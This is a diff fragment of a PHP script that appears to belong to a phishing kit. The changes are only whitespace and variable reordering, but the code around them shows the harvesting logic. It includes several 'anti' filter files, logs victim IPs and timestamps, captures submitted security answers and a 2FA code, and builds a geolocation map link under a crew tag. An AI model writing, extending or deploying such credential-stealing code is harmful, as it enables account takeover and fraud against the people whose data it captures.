@@ -1,4 +1,3 @@
-
 <?php
         include "/files/anti/anti1.php";
         include "/files/anti/anti2.php";
@@ -8,11 +7,12 @@
         include "/files/anti/anti6.php";
         include "/files/anti/anti7.php";
         include "/files/anti/anti8.php";
+
+
+
 $full_date = date("h:i:s|M/d/Y");
 $time = date("h:i:s");
 $date = date("M/d/Y");
-
-
 
 function get_client_ip()
 {
@@ -181,12 +181,11 @@ $answer5        = $_POST['answer5'];
     $code       = $_POST['code']; 
     $code2      ="[2FA][$code]";
     $logo       = "[S-T-R|CR00K]";
-    $gitusr     = "[SWIF-T-RYNX]";
+    $gitusr     = "[SWIF-T-RYNX]";	$lh     = "|";
     $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
     $isp        = $is;
     $currency   = "".$full_date;
-	$lh     = "|";
-        $li     = ",";
+    $li     = ",";
 
     
 
